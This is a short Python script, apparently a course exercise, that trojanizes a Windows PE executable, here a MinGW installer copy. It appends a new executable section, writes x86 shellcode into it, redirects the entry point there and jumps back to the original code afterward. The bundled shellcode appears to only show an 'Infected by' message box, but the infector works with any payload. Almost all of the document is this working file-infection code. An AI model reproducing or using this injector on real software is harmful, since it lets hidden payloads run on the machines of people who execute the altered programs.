import mmap
import pefile
import struct
from os import path
from math import ceil


class PeInfection:
    def __init__(self, filename, infected_file_name):
        self.infected_file_name = infected_file_name
        self.pe = pefile.PE(filename)
        self.last_section_index = self.pe.FILE_HEADER.NumberOfSections - 1
        self.section_alignment = self.pe.OPTIONAL_HEADER.SectionAlignment
        self.file_alignment = self.pe.OPTIONAL_HEADER.FileAlignment
        self.new_section_offset = (
            self.pe.sections[self.last_section_index].get_file_offset() + 40
        )
        self.raw_size = self.align(0x1000, self.file_alignment)
        self.virtual_size = self.align(0x1000, self.section_alignment)
        self.raw_data_offset = self.align(
            self.pe.sections[self.last_section_index].PointerToRawData
            + self.pe.sections[self.last_section_index].SizeOfRawData,
            self.file_alignment,
        )
        self.virtual_offset = self.align(
            self.pe.sections[self.last_section_index].VirtualAddress
            + self.pe.sections[self.last_section_index].Misc_VirtualSize,
            self.section_alignment,
        )
        self.old_ep = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint.to_bytes(4, "little")

    def align(self, value, alignment):
        return alignment * ceil(value / alignment)

    def add_section(self):
        characteristics = 0xE0000020
        name = ".uit" + (4 * "\x00")
        self.pe.set_bytes_at_offset(self.new_section_offset, name.encode())
        self.pe.set_dword_at_offset(self.new_section_offset + 8, self.virtual_size)
        self.pe.set_dword_at_offset(self.new_section_offset + 12, self.virtual_offset)
        self.pe.set_dword_at_offset(self.new_section_offset + 16, self.raw_size)
        self.pe.set_dword_at_offset(self.new_section_offset + 20, self.raw_data_offset)
        self.pe.set_bytes_at_offset(self.new_section_offset + 24, 12 * b"\x00")
        self.pe.set_dword_at_offset(self.new_section_offset + 36, characteristics)

        self.pe.FILE_HEADER.NumberOfSections += 1
        self.pe.OPTIONAL_HEADER.SizeOfImage = self.virtual_size + self.virtual_offset
        self.pe.write(self.infected_file_name)

    def infect(self, shellcode):
        self.add_section()

        return_ep = struct.pack(
            "<i",
            self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
            - self.virtual_offset
            - len(shellcode)
            - 5,
        )

        return_code = b"\xE9" + return_ep

        # Add file size
        ORIGINAL_SIZE = path.getsize(self.infected_file_name)
        with open(self.infected_file_name, "a+b") as fd:
            map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
            map.resize(ORIGINAL_SIZE + 0x2000)
            map.close()

        infectpe = pefile.PE(self.infected_file_name)
        # Insert shellcode
        infectpe.set_bytes_at_offset(self.raw_data_offset, shellcode + return_code)
        # Set new EP
        infectpe.OPTIONAL_HEADER.AddressOfEntryPoint = self.virtual_offset
        infectpe.write(self.infected_file_name)


filename = path.join(path.dirname(__file__), "test/mingw-get-setup.exe")
infected_file_name = path.join(path.dirname(__file__), "test/mingw-get-setup-moded.exe")

buf = b""
buf += b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
buf += b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
buf += b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
buf += b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
buf += b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
buf += b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
buf += b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
buf += b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
buf += b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
buf += b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
buf += b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
buf += b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
buf += b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
buf += b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
buf += b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
buf += b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68"
buf += b"\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c"
buf += b"\x24\x0a\x89\xe3\x68\x33\x58\x20\x20\x68\x32\x30\x32"
buf += b"\x39\x68\x5f\x31\x37\x35\x68\x30\x34\x34\x34\x68\x31"
buf += b"\x37\x35\x32\x68\x20\x62\x79\x20\x68\x63\x74\x65\x64"
buf += b"\x68\x49\x6e\x66\x65\x31\xc9\x88\x4c\x24\x1d\x89\xe1"
buf += b"\x31\xd2\x52\x53\x51\x52\xff\xd0"

pe = PeInfection(filename, infected_file_name)
pe.infect(buf)

